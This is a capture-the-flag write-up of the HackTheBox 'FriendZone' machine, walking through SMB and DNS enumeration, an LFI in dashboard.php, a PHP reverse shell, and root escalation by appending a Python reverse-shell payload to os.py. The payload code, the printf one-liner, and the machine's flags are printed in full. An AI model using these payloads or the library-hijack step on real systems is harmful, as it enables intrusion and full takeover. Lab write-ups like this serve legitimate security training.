---
title: HackTheBox - FriendZone
date: 2020-12-31 17:55:29 +0100
categories: [Hackthebox walkthroughs, Linux, Easy]
tags: [htb-linux-easy, samba, smbclient, smbmap, DNS, zone transfer, LFI, reverse-shell, python, cron, pspy, writeup, oscp-prep]
image: https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/FriendZone.png
---

## Foothold

### `nmap` scan

```bash
$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN FriendZone-full-port-scan.txt 10.10.10.123
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -36m13s, deviation: 1h09m16s, median: 3m45s
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2020-12-29T13:18:07+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-12-29T11:18:07
|_  start_date: N/A
```

Thanks to this scan we identified a domain name: `friendzone.red`, so I added it to my `/etc/hosts`:

![etc-hosts](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/etc-hosts.png)

### enum4linux

`enum4linux` identified a username:

![user friend found](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/smb-user-friend.png)

### ftp (ports 21)

![ftp](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/ftp.png)

### smb (ports 139 & 445)

```bash
$ smbclient -L //$TARGET
	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	Files           Disk      FriendZone Samba Server Files /etc/Files
	general         Disk      FriendZone Samba Server Files
	Development     Disk      FriendZone Samba Server Files
	IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

We can in the **comment** section that `Files` is in `/etc/`, so do `general` and `Development` directories probably.

![creds](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/445-creds.png)

We get some credentials that we will probably use later:

- username: **admin**
- password: **WORKWORKHhallelujah@#**

Plus, we can put files in `Development` directory.

### Apache/2.4.29 (ports 80)

![web](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/80.png)

Another domain name: `friendzoneportal.red`.

![dirb](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/80-dirb.png)

- **robots.txt**:

![robots.txt](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/80-robots-txt.png)

#### `/wordpress`

![wordpress](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/80-wordpress.png)

### fiendzone.red (ports 443)

![friendzone.red](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/friendzone-red.png)

![view-source friendzone.red](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/443-comment.png)

![friendzone.red /js/js](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/443-js-js.png)

#### `/admin`

![friendzone.red](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/443-admin.png)

### friendzoneportal.red (ports 443)

> Do not forget to update `/etc/hosts`

![friendzoneportal](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/443-friendzoneportal.png)

![dirb friendzoneportal](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/443-friendzoneportal-dirb.png)

### admin.friendzoneportal.red

Because of the _"creds for the admin THING:"_ in **creds.txt**, I tried the subdomain `admin.friendzoneportal.red` and it worked:

![admin panel](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/admin-panel.png)

We're successfully logged in with the credentials found via [smb](#smb-ports-139--445), but:

![admin panel successfully logged in](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/success.png)

_"check for another one"_, let's try with `dirb`.

Unfortunately:

![nothing](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/nothing.png)

### DNS (port 53)

> When DNS rely on TCP, usually it means that there are some zone transfer. 

#### friendzone.red

```bash
$ dig axfr @$TARGET friendzone.red  | tee services/53-friendzone-red.txt   
; <<>> DiG 9.16.8-Debian <<>> axfr @10.10.10.123 friendzone.red
; (1 server found)
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 100 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: Thu Dec 31 14:59:06 CET 2020
;; XFR size: 8 records (messages 1, bytes 289)
```

Okay so there are three other domain names:
- `administrator1.friendzone.red`
- `hr.friendzone.red`
- `uploads.friendzone.red`

#### friendzoneportal.red 

```bash
$ dig axfr @$TARGET friendzoneportal.red | tee services/53-friendzoneportal.txt
; <<>> DiG 9.16.8-Debian <<>> axfr @10.10.10.123 friendzoneportal.red
; (1 server found)
;; global options: +cmd
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzoneportal.red.   604800  IN      AAAA    ::1
friendzoneportal.red.   604800  IN      NS      localhost.
friendzoneportal.red.   604800  IN      A       127.0.0.1
admin.friendzoneportal.red. 604800 IN   A       127.0.0.1
files.friendzoneportal.red. 604800 IN   A       127.0.0.1
imports.friendzoneportal.red. 604800 IN A       127.0.0.1
vpn.friendzoneportal.red. 604800 IN     A       127.0.0.1
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 104 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: Thu Dec 31 15:01:19 CET 2020
;; XFR size: 9 records (messages 1, bytes 309)
```

We found three additional domain names:
- `files.friendzoneportal.red`
- `imports.friendzoneportal.red`
- `vpn.friendzoneportal.red`

### `aquatone`

![subdomains](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/subdomains.png)

![aquatone](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/aquatone.png)

We open `aquatone_report.html` with `firefox`.

Among all the new domain names we identified, the only ones that didn't respond with a **404 Not Found** error were `uploads.friendzone.red` and `administrator1.friendzone.red`.

### uploads.friendzone.red

![uploads](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/uploads.png)

I uploaded a benign picture and it seems that the upload worked: 

![uploads](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/upload.png)

I looked for hidden directories in order to retrieve the image that I uploaded but `/files` seems empty and `/files/note` that the site is still under development:

![uploads](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/uploads-dirb.png)

### administrator1.friendzone.red

The credentials found via [smb](#smb-ports-139--445) worked as well on this second admin panel:

![second admin panel](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/admin1.png)

![login done](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/admin1-login-done.png)

- `/dashboard.php`:

![smart photos](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/admin1-smart-photos.png)

I filled the parameters `image_id` and `pagename` with the filename and timestamp I'v got in response when I uploaded an image in [uploads.friendzone.red](#uploadsfriendzonered).

![bug](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/admin1-smart-photos-bug.png)

I replaced `image_id`'s value by `a.jpg` and I got this result:

![haha](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/admin1-haha.png)

I replaced `image_id`'s value by `b.jpg` _(which is the other image in `/images` folder)_ and `pagename`'s value by `timestamp`. I got this result:
![haha](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/admin1-timestamp.png)

I replaced `pagename`'s value by `dashboard` and the page was continuously including itself: 

![haha](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/admin1-double-inclusion.png)

This is a **LFI**(**L**ocale **F**ile **I**nclusion) vulnerability!

___

## Assembling pieces

So far, we noticed that:

- We can write files in `Development` shared directory. (See [smb](#smb-ports-139--445) chapter) 
- We can read php pages from `https://administrator1.friendzone.red/dashboard.php?image_id=b.jpg&pagename=<PHP PAGE>`.

### reverse shell

Let's try to upload a [tiny PHP reverse shell](https://gist.github.com/rshipp/eee36684db07d234c1cc):

![smb put shell.php](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/smb-put.png)

Run a listener on our machine:

```bash
$ nc -lnvp 1234
```

Then open it from [https://administrator1.friendzone.red/dashboard.php?image_id=b.jpg&pagename=../../../../../../../../../../../etc/Development/shell](https://administrator1.friendzone.red/dashboard.php?image_id=b.jpg&pagename=../../../../../../../../../../../etc/Development/shell) 

BOUM!

![reverse-shell](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/reverse-shell.png)
___

## User's flag (friend)

```bash
$ cd /home
$ ls -la
total 12
drwxr-xr-x  3 root   root   4096 Oct  5  2018 .
drwxr-xr-x 22 root   root   4096 Oct  5  2018 ..
drwxr-xr-x  5 friend friend 4096 Jan 24  2019 friend
$ cd friend
$ ls -la
total 36
drwxr-xr-x 5 friend friend 4096 Jan 24  2019 .
drwxr-xr-x 3 root   root   4096 Oct  5  2018 ..
lrwxrwxrwx 1 root   root      9 Jan 24  2019 .bash_history -> /dev/null
-rw-r--r-- 1 friend friend  220 Oct  5  2018 .bash_logout
-rw-r--r-- 1 friend friend 3771 Oct  5  2018 .bashrc
drwx------ 2 friend friend 4096 Oct  5  2018 .cache
drwx------ 3 friend friend 4096 Oct  6  2018 .gnupg
drwxrwxr-x 3 friend friend 4096 Oct  6  2018 .local
-rw-r--r-- 1 friend friend  807 Oct  5  2018 .profile
-rw-r--r-- 1 friend friend    0 Oct  5  2018 .sudo_as_admin_successful
-r--r--r-- 1 root   root     33 Oct  6  2018 user.txt
$ cat user.txt
a9ed20acecd6c5b6b52f474e15ae9a11
```

## Privesc to Root

`linpeas.sh` told me something interesting:

![linpeas-writable-files](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/linpeas-writable-files.png)

Since our current user has not high privileges, we're running [pspy](https://github.com/DominicBreuker/pspy) to identify cron jobs that we don't have permission to see:

![pspy](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/pspy.png)

`/opt/server_admin/reporter.py` seems to be executed from a cron job. We can read it:

```bash
$ ls -la
total 12
drwxr-xr-x 2 root root 4096 Jan 24  2019 .
drwxr-xr-x 3 root root 4096 Oct  6  2018 ..
-rwxr--r-- 1 root root  424 Jan 16  2019 reporter.py
```

```python
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
www-data@FriendZone:/opt/server_admin$
```

The script import **os** python's module that we can edit. So we just have to edit it and put a malicious content in it:

```python
import socket,subprocess,pty
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.3",4242))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```

```bash
$ printf '\nimport socket,subprocess,pty\ns = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("10.10.14.3",4242))\ndup2(s.fileno(),0)\ndup2(s.fileno(),1)\ndup2(s.fileno(),2)\npty.spawn("/bin/bash")\n' >> /usr/lib/python2.7/os.py
```

![root flag](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/friendzone/root-flag.png)

- flag: `b0e6c60b82cf96e9855ac1656a9e90c7`

___

## Useful links

- [tiny PHP reverse shell](https://gist.github.com/rshipp/eee36684db07d234c1cc)
- [aquatone - a tool for visual inspection of websites across a large amount of hosts](https://github.com/michenriksen/aquatone)
- [pspy - unprivileged Linux process snooping](https://github.com/DominicBreuker/pspy)
- [reverse shell python](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python)
